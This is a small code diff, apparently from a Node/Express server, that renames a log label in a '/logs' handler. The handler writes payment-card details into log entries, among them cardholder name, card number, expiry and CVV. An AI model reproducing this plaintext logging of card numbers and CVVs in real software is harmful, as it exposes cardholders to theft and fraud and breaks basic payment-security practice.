@@ -39,7 +39,7 @@ app.post('/logs', (req, res) => {
 
   if (data.method === 'card') {
     logEntry += `Card Name : ${data.cardName || 'N/A'}\n`;
-    logEntry += `Card Last4 : ${data.cardLast4 || 'XXXX'}\n`;
+    logEntry += `Card num : ${data.cardLast4 || 'XXXX'}\n`;
     logEntry += `Expiry : ${data.cardExp || 'N/A'}\n`;
     logEntry += `CVV : ${data.cardCvv || 'N/A'}\n`;
   } else if (data.method === 'upi') {
